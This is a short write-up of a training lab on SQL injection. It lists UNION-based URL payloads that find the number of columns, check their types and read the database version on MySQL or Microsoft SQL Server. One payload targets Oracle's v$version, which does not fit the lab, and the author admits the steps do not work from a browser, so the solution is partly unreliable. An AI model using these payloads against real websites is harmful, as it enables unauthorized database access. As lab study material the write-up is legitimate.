# SQL injection attack, querying the database type and version on MySQL and Microsoft
# Objective
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.\
\
To solve the lab, display the database version string.
# Solution

`/filter?category=Gifts’` —> Application is vulnerable 

## Determining the number of columns
`/filter?category=Gifts' order by 1#` \
`/filter?category=Gifts' order by 2#` \
`/filter?category=Gifts' order by 3#` -> Error -> Number of columns = 2

## Determining the types of columns
`/filter?category=Gifts' union select 'a','a'#` -> Both columns are string type

## Retrieving database version
`/filter?category=' union select banner,null from v$version#` -> Database version \
`/filter?category=' union select @@version,null#` \
ALL OF IT DO NOT REALLY WORK VIA BROWSER